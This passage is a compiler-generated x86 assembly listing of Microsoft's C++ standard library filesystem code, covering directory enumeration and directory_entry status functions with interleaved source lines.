	00 00		 mov	 DWORD PTR $T2[ebp+4], 0
  00080	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00083	8b 4d e4	 mov	 ecx, DWORD PTR $T2[ebp]
  00086	8b 55 e8	 mov	 edx, DWORD PTR $T2[ebp+4]
  00089	89 88 6c 02 00
	00		 mov	 DWORD PTR [eax+620], ecx
  0008f	89 90 70 02 00
	00		 mov	 DWORD PTR [eax+624], edx

; 2578 :                 } else {

  00095	eb 1f		 jmp	 SHORT $LN5@Creator
$LN4@Creator:

; 2579 :                     _Status = {false, _Error};

  00097	c6 45 dc 00	 mov	 BYTE PTR $T1[ebp], 0
  0009b	8b 45 f8	 mov	 eax, DWORD PTR __Error$[ebp]
  0009e	89 45 e0	 mov	 DWORD PTR $T1[ebp+4], eax
  000a1	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  000a4	8b 55 dc	 mov	 edx, DWORD PTR $T1[ebp]
  000a7	8b 45 e0	 mov	 eax, DWORD PTR $T1[ebp+4]
  000aa	89 91 6c 02 00
	00		 mov	 DWORD PTR [ecx+620], edx
  000b0	89 81 70 02 00
	00		 mov	 DWORD PTR [ecx+624], eax
$LN5@Creator:

; 2580 :                 }
; 2581 :             }

  000b6	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  000b9	8b e5		 mov	 esp, ebp
  000bb	5d		 pop	 ebp
  000bc	c2 08 00	 ret	 8
??0_Creator@_Dir_enum_impl@filesystem@std@@QAE@ABVpath@23@W4directory_options@23@@Z ENDP ; std::filesystem::_Dir_enum_impl::_Creator::_Creator
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Open_dir@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAVpath@23@W4directory_options@23@AAU_Find_file_handle@23@AAU__std_fs_find_data@@@Z
_TEXT	SEGMENT
$T1 = -16						; size = 8
__Null_term_len$ = -8					; size = 4
__Error$ = -4						; size = 4
__Path$ = 8						; size = 4
__Options_arg$ = 12					; size = 4
__Dir$ = 16						; size = 4
__Data$ = 20						; size = 4
?_Open_dir@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAVpath@23@W4directory_options@23@AAU_Find_file_handle@23@AAU__std_fs_find_data@@@Z PROC ; std::filesystem::_Dir_enum_impl::_Open_dir, COMDAT

; 2540 :             path& _Path, const directory_options _Options_arg, _Find_file_handle& _Dir, __std_fs_find_data& _Data) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H

; 2541 :             const size_t _Null_term_len = _CSTD wcslen(_Path.c_str());

  00006	8b 4d 08	 mov	 ecx, DWORD PTR __Path$[ebp]
  00009	e8 00 00 00 00	 call	 ?c_str@path@filesystem@std@@QBEPB_WXZ ; std::filesystem::path::c_str
  0000e	50		 push	 eax
  0000f	e8 00 00 00 00	 call	 _wcslen
  00014	83 c4 04	 add	 esp, 4
  00017	89 45 f8	 mov	 DWORD PTR __Null_term_len$[ebp], eax

; 2542 :             if (_Null_term_len == 0 || _Null_term_len != _Path.native().size()) {

  0001a	83 7d f8 00	 cmp	 DWORD PTR __Null_term_len$[ebp], 0
  0001e	74 14		 je	 SHORT $LN3@Open_dir
  00020	8b 4d 08	 mov	 ecx, DWORD PTR __Path$[ebp]
  00023	e8 00 00 00 00	 call	 ?native@path@filesystem@std@@QBEABV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@3@XZ ; std::filesystem::path::native
  00028	8b c8		 mov	 ecx, eax
  0002a	e8 00 00 00 00	 call	 ?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QBEIXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
  0002f	39 45 f8	 cmp	 DWORD PTR __Null_term_len$[ebp], eax
  00032	74 07		 je	 SHORT $LN2@Open_dir
$LN3@Open_dir:

; 2543 :                 return __std_win_error::_File_not_found;

  00034	b8 02 00 00 00	 mov	 eax, 2
  00039	eb 73		 jmp	 SHORT $LN1@Open_dir
$LN2@Open_dir:

; 2544 :             }
; 2545 : 
; 2546 :             _Path /= L"*"sv;

  0003b	6a 01		 push	 1
  0003d	68 00 00 00 00	 push	 OFFSET ??_C@_13BBDEGPLJ@?$AA?$CK@
  00042	8d 45 f0	 lea	 eax, DWORD PTR $T1[ebp]
  00045	50		 push	 eax
  00046	e8 00 00 00 00	 call	 ??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@3@PB_WI@Z ; std::literals::string_view_literals::operator "" sv
  0004b	83 c4 0c	 add	 esp, 12			; 0000000cH
  0004e	50		 push	 eax
  0004f	8b 4d 08	 mov	 ecx, DWORD PTR __Path$[ebp]
  00052	e8 00 00 00 00	 call	 ??$?_0V?$basic_string_view@_WU?$char_traits@_W@std@@@std@@$0A@@path@filesystem@std@@QAEAAV012@ABV?$basic_string_view@_WU?$char_traits@_W@std@@@2@@Z ; std::filesystem::path::operator/=<std::basic_string_view<wchar_t,std::char_traits<wchar_t> >,0>

; 2547 :             auto _Error = _Dir._Open(_Path.c_str(), &_Data);

  00057	8b 4d 14	 mov	 ecx, DWORD PTR __Data$[ebp]
  0005a	51		 push	 ecx
  0005b	8b 4d 08	 mov	 ecx, DWORD PTR __Path$[ebp]
  0005e	e8 00 00 00 00	 call	 ?c_str@path@filesystem@std@@QBEPB_WXZ ; std::filesystem::path::c_str
  00063	50		 push	 eax
  00064	8b 4d 10	 mov	 ecx, DWORD PTR __Dir$[ebp]
  00067	e8 00 00 00 00	 call	 ?_Open@_Find_file_handle@filesystem@std@@QAE?AW4__std_win_error@@PB_WPAU__std_fs_find_data@@@Z ; std::filesystem::_Find_file_handle::_Open
  0006c	89 45 fc	 mov	 DWORD PTR __Error$[ebp], eax

; 2548 :             if (_Error == __std_win_error::_Success) {

  0006f	83 7d fc 00	 cmp	 DWORD PTR __Error$[ebp], 0
  00073	75 14		 jne	 SHORT $LN4@Open_dir

; 2549 :                 return _Skip_dots(_Dir._Handle, _Data);

  00075	8b 55 14	 mov	 edx, DWORD PTR __Data$[ebp]
  00078	52		 push	 edx
  00079	8b 45 10	 mov	 eax, DWORD PTR __Dir$[ebp]
  0007c	8b 08		 mov	 ecx, DWORD PTR [eax]
  0007e	51		 push	 ecx
  0007f	e8 00 00 00 00	 call	 ?_Skip_dots@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@W4__std_fs_dir_handle@@AAU__std_fs_find_data@@@Z ; std::filesystem::_Dir_enum_impl::_Skip_dots
  00084	83 c4 08	 add	 esp, 8
  00087	eb 25		 jmp	 SHORT $LN1@Open_dir
$LN4@Open_dir:

; 2550 :             }
; 2551 : 
; 2552 :             if (_Error == __std_win_error::_Access_denied
; 2553 :                 && _Bitmask_includes_any(_Options_arg, directory_options::skip_permission_denied)) {

  00089	83 7d fc 05	 cmp	 DWORD PTR __Error$[ebp], 5
  0008d	75 1c		 jne	 SHORT $LN5@Open_dir
  0008f	6a 02		 push	 2
  00091	8b 55 0c	 mov	 edx, DWORD PTR __Options_arg$[ebp]
  00094	52		 push	 edx
  00095	e8 00 00 00 00	 call	 ??$_Bitmask_includes_any@W4directory_options@filesystem@std@@@std@@YA_NW4directory_options@filesystem@0@0@Z ; std::_Bitmask_includes_any<enum std::filesystem::directory_options>
  0009a	83 c4 08	 add	 esp, 8
  0009d	0f b6 c0	 movzx	 eax, al
  000a0	85 c0		 test	 eax, eax
  000a2	74 07		 je	 SHORT $LN5@Open_dir

; 2554 :                 _Error = __std_win_error::_No_more_files;

  000a4	c7 45 fc 12 00
	00 00		 mov	 DWORD PTR __Error$[ebp], 18 ; 00000012H
$LN5@Open_dir:

; 2555 :             }
; 2556 : 
; 2557 :             return _Error;

  000ab	8b 45 fc	 mov	 eax, DWORD PTR __Error$[ebp]
$LN1@Open_dir:

; 2558 :         }

  000ae	8b e5		 mov	 esp, ebp
  000b0	5d		 pop	 ebp
  000b1	c3		 ret	 0
?_Open_dir@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAVpath@23@W4directory_options@23@AAU_Find_file_handle@23@AAU__std_fs_find_data@@@Z ENDP ; std::filesystem::_Dir_enum_impl::_Open_dir
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Skip_dots@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@W4__std_fs_dir_handle@@AAU__std_fs_find_data@@@Z
_TEXT	SEGMENT
__Error$1 = -4						; size = 4
__Dir_handle$ = 8					; size = 4
__Data$ = 12						; size = 4
?_Skip_dots@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@W4__std_fs_dir_handle@@AAU__std_fs_find_data@@@Z PROC ; std::filesystem::_Dir_enum_impl::_Skip_dots, COMDAT

; 2528 :             __std_fs_dir_handle _Dir_handle, __std_fs_find_data& _Data) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
$LN2@Skip_dots:

; 2529 :             while (_Is_dot_or_dotdot(_Data)) {

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Data$[ebp]
  00007	50		 push	 eax
  00008	e8 00 00 00 00	 call	 ?_Is_dot_or_dotdot@filesystem@std@@YA_NABU__std_fs_find_data@@@Z ; std::filesystem::_Is_dot_or_dotdot
  0000d	83 c4 04	 add	 esp, 4
  00010	0f b6 c8	 movzx	 ecx, al
  00013	85 c9		 test	 ecx, ecx
  00015	74 1d		 je	 SHORT $LN3@Skip_dots

; 2530 :                 const auto _Error = __std_fs_directory_iterator_advance(_Dir_handle, &_Data);

  00017	8b 55 0c	 mov	 edx, DWORD PTR __Data$[ebp]
  0001a	52		 push	 edx
  0001b	8b 45 08	 mov	 eax, DWORD PTR __Dir_handle$[ebp]
  0001e	50		 push	 eax
  0001f	e8 00 00 00 00	 call	 ___std_fs_directory_iterator_advance@8
  00024	89 45 fc	 mov	 DWORD PTR __Error$1[ebp], eax

; 2531 :                 if (_Error != __std_win_error::_Success) {

  00027	83 7d fc 00	 cmp	 DWORD PTR __Error$1[ebp], 0
  0002b	74 05		 je	 SHORT $LN4@Skip_dots

; 2532 :                     return _Error;

  0002d	8b 45 fc	 mov	 eax, DWORD PTR __Error$1[ebp]
  00030	eb 04		 jmp	 SHORT $LN1@Skip_dots
$LN4@Skip_dots:

; 2533 :                 }
; 2534 :             }

  00032	eb d0		 jmp	 SHORT $LN2@Skip_dots
$LN3@Skip_dots:

; 2535 : 
; 2536 :             return __std_win_error::_Success;

  00034	33 c0		 xor	 eax, eax
$LN1@Skip_dots:

; 2537 :         }

  00036	8b e5		 mov	 esp, ebp
  00038	5d		 pop	 ebp
  00039	c3		 ret	 0
?_Skip_dots@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@W4__std_fs_dir_handle@@AAU__std_fs_find_data@@@Z ENDP ; std::filesystem::_Dir_enum_impl::_Skip_dots
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Advance_and_reset_if_no_more_files@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@3@@Z
_TEXT	SEGMENT
__Impl$ = -604						; size = 4
__Error$1 = -600					; size = 4
__Data$ = -596						; size = 592
__$ArrayPad$ = -4					; size = 4
__Ptr$ = 8						; size = 4
?_Advance_and_reset_if_no_more_files@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@3@@Z PROC ; std::filesystem::_Dir_enum_impl::_Advance_and_reset_if_no_more_files, COMDAT

; 2509 :         _NODISCARD static __std_win_error _Advance_and_reset_if_no_more_files(shared_ptr<_Dir_enum_impl>& _Ptr) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	81 ec 5c 02 00
	00		 sub	 esp, 604		; 0000025cH
  00009	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000e	33 c5		 xor	 eax, ebp
  00010	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax

; 2510 :             auto& _Impl = *_Ptr;

  00013	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00016	e8 00 00 00 00	 call	 ??$?DU_Dir_enum_impl@filesystem@std@@$0A@@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QBEAAU_Dir_enum_impl@filesystem@1@XZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::operator*<std::filesystem::_Dir_enum_impl,0>
  0001b	89 85 a4 fd ff
	ff		 mov	 DWORD PTR __Impl$[ebp], eax
$LN4@Advance_an:

; 2511 :             __std_fs_find_data _Data;
; 2512 :             do {
; 2513 :                 const auto _Error = __std_fs_directory_iterator_advance(_Impl._Dir._Handle, &_Data);

  00021	8d 85 ac fd ff
	ff		 lea	 eax, DWORD PTR __Data$[ebp]
  00027	50		 push	 eax
  00028	8b 8d a4 fd ff
	ff		 mov	 ecx, DWORD PTR __Impl$[ebp]
  0002e	8b 51 38	 mov	 edx, DWORD PTR [ecx+56]
  00031	52		 push	 edx
  00032	e8 00 00 00 00	 call	 ___std_fs_directory_iterator_advance@8
  00037	89 85 a8 fd ff
	ff		 mov	 DWORD PTR __Error$1[ebp], eax

; 2514 :                 if (_Error == __std_win_error::_No_more_files) {

  0003d	83 bd a8 fd ff
	ff 12		 cmp	 DWORD PTR __Error$1[ebp], 18 ; 00000012H
  00044	75 0c		 jne	 SHORT $LN5@Advance_an

; 2515 :                     _Ptr.reset();

  00046	8b 4d 08	 mov	 ecx, DWORD PTR __Ptr$[ebp]
  00049	e8 00 00 00 00	 call	 ?reset@?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@std@@QAEXXZ ; std::shared_ptr<std::filesystem::_Dir_enum_impl>::reset

; 2516 :                     return __std_win_error::_Success;

  0004e	33 c0		 xor	 eax, eax
  00050	eb 3b		 jmp	 SHORT $LN1@Advance_an
$LN5@Advance_an:

; 2517 :                 }
; 2518 : 
; 2519 :                 if (_Error != __std_win_error::_Success) {

  00052	83 bd a8 fd ff
	ff 00		 cmp	 DWORD PTR __Error$1[ebp], 0
  00059	74 08		 je	 SHORT $LN6@Advance_an

; 2520 :                     return _Error;

  0005b	8b 85 a8 fd ff
	ff		 mov	 eax, DWORD PTR __Error$1[ebp]
  00061	eb 2a		 jmp	 SHORT $LN1@Advance_an
$LN6@Advance_an:

; 2521 :                 }
; 2522 :             } while (_Is_dot_or_dotdot(_Data));

  00063	8d 85 ac fd ff
	ff		 lea	 eax, DWORD PTR __Data$[ebp]
  00069	50		 push	 eax
  0006a	e8 00 00 00 00	 call	 ?_Is_dot_or_dotdot@filesystem@std@@YA_NABU__std_fs_find_data@@@Z ; std::filesystem::_Is_dot_or_dotdot
  0006f	83 c4 04	 add	 esp, 4
  00072	0f b6 c8	 movzx	 ecx, al
  00075	85 c9		 test	 ecx, ecx
  00077	75 a8		 jne	 SHORT $LN4@Advance_an

; 2523 :             _Impl._Refresh(_Data); // can throw

  00079	8d 95 ac fd ff
	ff		 lea	 edx, DWORD PTR __Data$[ebp]
  0007f	52		 push	 edx
  00080	8b 8d a4 fd ff
	ff		 mov	 ecx, DWORD PTR __Impl$[ebp]
  00086	e8 00 00 00 00	 call	 ?_Refresh@_Dir_enum_impl@filesystem@std@@QAEXABU__std_fs_find_data@@@Z ; std::filesystem::_Dir_enum_impl::_Refresh

; 2524 :             return __std_win_error::_Success;

  0008b	33 c0		 xor	 eax, eax
$LN1@Advance_an:

; 2525 :         }

  0008d	8b 4d fc	 mov	 ecx, DWORD PTR __$ArrayPad$[ebp]
  00090	33 cd		 xor	 ecx, ebp
  00092	e8 00 00 00 00	 call	 @__security_check_cookie@4
  00097	8b e5		 mov	 esp, ebp
  00099	5d		 pop	 ebp
  0009a	c3		 ret	 0
?_Advance_and_reset_if_no_more_files@_Dir_enum_impl@filesystem@std@@SA?AW4__std_win_error@@AAV?$shared_ptr@U_Dir_enum_impl@filesystem@std@@@3@@Z ENDP ; std::filesystem::_Dir_enum_impl::_Advance_and_reset_if_no_more_files
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ??Ifilesystem@std@@YA?AW4directory_options@01@W4201@0@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
??Ifilesystem@std@@YA?AW4directory_options@01@W4201@0@Z PROC ; std::filesystem::operator&, COMDAT

; 2506 :     _BITMASK_OPS(_EXPORT_STD, directory_options)

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00006	23 45 0c	 and	 eax, DWORD PTR __Right$[ebp]
  00009	5d		 pop	 ebp
  0000a	c3		 ret	 0
??Ifilesystem@std@@YA?AW4directory_options@01@W4201@0@Z ENDP ; std::filesystem::operator&
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\type_traits
;	COMDAT ??$_Bitmask_includes_all@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z
_TEXT	SEGMENT
tv68 = -4						; size = 4
__Left$ = 8						; size = 4
__Elements$ = 12					; size = 4
??$_Bitmask_includes_all@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z PROC ; std::_Bitmask_includes_all<enum __std_fs_stats_flags>, COMDAT

; 2303 : _NODISCARD constexpr bool _Bitmask_includes_all(_Bitmask _Left, _Bitmask _Elements) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 2304 :     return (_Left & _Elements) == _Elements;

  00004	8b 45 0c	 mov	 eax, DWORD PTR __Elements$[ebp]
  00007	50		 push	 eax
  00008	8b 4d 08	 mov	 ecx, DWORD PTR __Left$[ebp]
  0000b	51		 push	 ecx
  0000c	e8 00 00 00 00	 call	 ??I@YA?AW4__std_fs_stats_flags@@W40@0@Z ; operator&
  00011	83 c4 08	 add	 esp, 8
  00014	3b 45 0c	 cmp	 eax, DWORD PTR __Elements$[ebp]
  00017	75 09		 jne	 SHORT $LN3@Bitmask_in
  00019	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv68[ebp], 1
  00020	eb 07		 jmp	 SHORT $LN4@Bitmask_in
$LN3@Bitmask_in:
  00022	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv68[ebp], 0
$LN4@Bitmask_in:
  00029	0f b6 45 fc	 movzx	 eax, BYTE PTR tv68[ebp]

; 2305 : }

  0002d	8b e5		 mov	 esp, ebp
  0002f	5d		 pop	 ebp
  00030	c3		 ret	 0
??$_Bitmask_includes_all@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z ENDP ; std::_Bitmask_includes_all<enum __std_fs_stats_flags>
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Refresh@directory_entry@filesystem@std@@AAEXABU__std_fs_find_data@@@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Data$ = 8						; size = 4
?_Refresh@directory_entry@filesystem@std@@AAEXABU__std_fs_find_data@@@Z PROC ; std::filesystem::directory_entry::_Refresh, COMDAT
; _this$ = ecx

; 2468 :         void _Refresh(const __std_fs_find_data& _Data) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	56		 push	 esi
  00005	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2469 :             _Cached_data._Attributes        = _Data._Attributes;

  00008	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000b	8b 4d 08	 mov	 ecx, DWORD PTR __Data$[ebp]
  0000e	8b 11		 mov	 edx, DWORD PTR [ecx]
  00010	89 50 10	 mov	 DWORD PTR [eax+16], edx

; 2470 :             _Cached_data._Reparse_point_tag = _Data._Reparse_point_tag;

  00013	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00016	8b 4d 08	 mov	 ecx, DWORD PTR __Data$[ebp]
  00019	8b 51 24	 mov	 edx, DWORD PTR [ecx+36]
  0001c	89 50 14	 mov	 DWORD PTR [eax+20], edx

; 2471 :             _Cached_data._Available         = __std_fs_stats_flags::_Attributes | __std_fs_stats_flags::_Reparse_tag;

  0001f	6a 04		 push	 4
  00021	6a 02		 push	 2
  00023	e8 00 00 00 00	 call	 ??U@YA?AW4__std_fs_stats_flags@@W40@0@Z ; operator|
  00028	83 c4 08	 add	 esp, 8
  0002b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0002e	89 41 1c	 mov	 DWORD PTR [ecx+28], eax

; 2472 :             if (!_Bitmask_includes_any(_Data._Attributes, __std_fs_file_attr::_Reparse_point)) {

  00031	68 00 04 00 00	 push	 1024			; 00000400H
  00036	8b 55 08	 mov	 edx, DWORD PTR __Data$[ebp]
  00039	8b 02		 mov	 eax, DWORD PTR [edx]
  0003b	50		 push	 eax
  0003c	e8 00 00 00 00	 call	 ??$_Bitmask_includes_any@W4__std_fs_file_attr@@@std@@YA_NW4__std_fs_file_attr@@0@Z ; std::_Bitmask_includes_any<enum __std_fs_file_attr>
  00041	83 c4 08	 add	 esp, 8
  00044	0f b6 c8	 movzx	 ecx, al
  00047	85 c9		 test	 ecx, ecx
  00049	75 55		 jne	 SHORT $LN2@Refresh

; 2473 :                 _Cached_data._File_size = (static_cast<uintmax_t>(_Data._File_size_high) << 32)

  0004b	8b 55 08	 mov	 edx, DWORD PTR __Data$[ebp]
  0004e	33 c9		 xor	 ecx, ecx
  00050	8b 42 1c	 mov	 eax, DWORD PTR [edx+28]
  00053	8b d1		 mov	 edx, ecx
  00055	b1 20		 mov	 cl, 32			; 00000020H
  00057	e8 00 00 00 00	 call	 __allshl
  0005c	8b 4d 08	 mov	 ecx, DWORD PTR __Data$[ebp]
  0005f	33 f6		 xor	 esi, esi
  00061	03 41 20	 add	 eax, DWORD PTR [ecx+32]
  00064	13 d6		 adc	 edx, esi
  00066	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00069	89 41 08	 mov	 DWORD PTR [ecx+8], eax
  0006c	89 51 0c	 mov	 DWORD PTR [ecx+12], edx

; 2474 :                                         + static_cast<uintmax_t>(_Data._File_size_low);
; 2475 :                 _CSTD memcpy(

  0006f	6a 08		 push	 8
  00071	8b 55 08	 mov	 edx, DWORD PTR __Data$[ebp]
  00074	83 c2 14	 add	 edx, 20			; 00000014H
  00077	52		 push	 edx
  00078	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0007b	50		 push	 eax
  0007c	e8 00 00 00 00	 call	 _memcpy
  00081	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2476 :                     &_Cached_data._Last_write_time, &_Data._Last_write_time, sizeof(_Cached_data._Last_write_time));
; 2477 :                 _Cached_data._Available |= __std_fs_stats_flags::_File_size | __std_fs_stats_flags::_Last_write_time;

  00084	6a 20		 push	 32			; 00000020H
  00086	6a 08		 push	 8
  00088	e8 00 00 00 00	 call	 ??U@YA?AW4__std_fs_stats_flags@@W40@0@Z ; operator|
  0008d	83 c4 08	 add	 esp, 8
  00090	50		 push	 eax
  00091	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00094	83 c1 1c	 add	 ecx, 28			; 0000001cH
  00097	51		 push	 ecx
  00098	e8 00 00 00 00	 call	 ??_5@YAAAW4__std_fs_stats_flags@@AAW40@W40@@Z ; operator|=
  0009d	83 c4 08	 add	 esp, 8
$LN2@Refresh:

; 2478 :             }
; 2479 :         }

  000a0	5e		 pop	 esi
  000a1	8b e5		 mov	 esp, ebp
  000a3	5d		 pop	 ebp
  000a4	c2 04 00	 ret	 4
?_Refresh@directory_entry@filesystem@std@@AAEXABU__std_fs_find_data@@@Z ENDP ; std::filesystem::directory_entry::_Refresh
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?status@directory_entry@filesystem@std@@QBE?AVfile_status@23@XZ
_TEXT	SEGMENT
__Result$ = -16						; size = 12
_this$ = -4						; size = 4
___$ReturnUdt$ = 8					; size = 4
?status@directory_entry@filesystem@std@@QBE?AVfile_status@23@XZ PROC ; std::filesystem::directory_entry::status, COMDAT
; _this$ = ecx

; 2399 :         _NODISCARD file_status status() const {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H
  00006	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 2400 :             const auto _Result = _Get_any_status(_Status_stats_flags);

  00009	6a 03		 push	 3
  0000b	8d 45 f0	 lea	 eax, DWORD PTR __Result$[ebp]
  0000e	50		 push	 eax
  0000f	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  00012	e8 00 00 00 00	 call	 ?_Get_any_status@directory_entry@filesystem@std@@ABE?AU_File_status_and_error@23@W4__std_fs_stats_flags@@@Z ; std::filesystem::directory_entry::_Get_any_status

; 2401 :             if (_Result._Not_good()) {

  00017	8d 4d f0	 lea	 ecx, DWORD PTR __Result$[ebp]
  0001a	e8 00 00 00 00	 call	 ?_Not_good@_File_status_and_error@filesystem@std@@QBE_NXZ ; std::filesystem::_File_status_and_error::_Not_good
  0001f	0f b6 c8	 movzx	 ecx, al
  00022	85 c9		 test	 ecx, ecx
  00024	74 15		 je	 SHORT $LN2@status

; 2402 :                 _Throw_fs_error("directory_entry::status", _Result._Error, _Path);

  00026	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00029	83 c2 20	 add	 edx, 32			; 00000020H
  0002c	52		 push	 edx
  0002d	8b 45 f8	 mov	 eax, DWORD PTR __Result$[ebp+8]
  00030	50		 push	 eax
  00031	68 00 00 00 00	 push	 OFFSET ??_C@_0BI@LBKDNGFK@directory_entry?3?3status@
  00036	e8 00 00 00 00	 call	 ?_Throw_fs_error@filesystem@std@@YAXPBDW4__std_win_error@@ABVpath@12@@Z ; std::filesystem::_Throw_fs_error
$LN2@status:

; 2403 :             }
; 2404 : 
; 2405 :             return _Result._Status;

  0003b	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0003e	8b 55 f0	 mov	 edx, DWORD PTR __Result$[ebp]
  00041	8b 45 f4	 mov	 eax, DWORD PTR __Result$[ebp+4]
  00044	89 11		 mov	 DWORD PTR [ecx], edx
  00046	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00049	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]
$LN1@status:

; 2406 :         }

  0004c	8b e5		 mov	 esp, ebp
  0004e	5d		 pop	 ebp
  0004f	c2 04 00	 ret	 4
?status@directory_entry@filesystem@std@@QBE?AVfile_status@23@XZ ENDP ; std::filesystem::directory_entry::status
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\filesystem
;	COMDAT ?_Get_any_status@directory_entry@filesystem@std@@ABE?AU_File_status_and_error@23@W4__std_fs_stats_flags@@@Z
_TEXT	SEGMENT
tv88 = -64						; size = 4
tv90 = -60						; size = 4
__Result$ = -56						; size = 12
__Error$1 = -44						; size = 4
_this$ = -40						; size = 4
__Stats$ = -36						; size = 32
__$ArrayPad$ = -4					; size = 4
___$ReturnUdt$ = 8					; size = 4
__Flags$ = 12						; size = 4
?_Get_any_status@directory_entry@filesystem@std@@ABE?AU_File_status_and_error@23@W4__std_fs_stats_flags@@@Z PROC ; std::filesystem::directory_entry::_Get_any_status, COMDAT
; _this$ = ecx

; 2381 :         _NODISCARD _File_status_and_error _Get_any_status(const __std_fs_stats_flags _Flags) const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 40	 sub	 esp, 64			; 00000040H
  00006	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0000b	33 c5		 xor	 eax, ebp
  0000d	89 45 fc	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00010	89 4d d8	 mov	 DWORD PTR _this$[ebp], ecx

; 2382 :             _File_status_and_error _Result;

  00013	8d 4d c8	 lea	 ecx, DWORD PTR __Result$[ebp]
  00016	e8 00 00 00 00	 call	 ??0_File_status_and_error@filesystem@std@@QAE@XZ

; 2383 :             __std_fs_stats _Stats;
; 2384 : 
; 2385 :             if (_Bitmask_includes_all(_Cached_data._Available, _Flags)) {

  0001b	8b 45 0c	 mov	 eax, DWORD PTR __Flags$[ebp]
  0001e	50		 push	 eax
  0001f	8b 4d d8	 mov	 ecx, DWORD PTR _this$[ebp]
  00022	8b 51 1c	 mov	 edx, DWORD PTR [ecx+28]
  00025	52		 push	 edx
  00026	e8 00 00 00 00	 call	 ??$_Bitmask_includes_all@W4__std_fs_stats_flags@@@std@@YA_NW4__std_fs_stats_flags@@0@Z ; std::_Bitmask_includes_all<enum __std_fs_stats_flags>
  0002b	83 c4 08	 add	 esp, 8
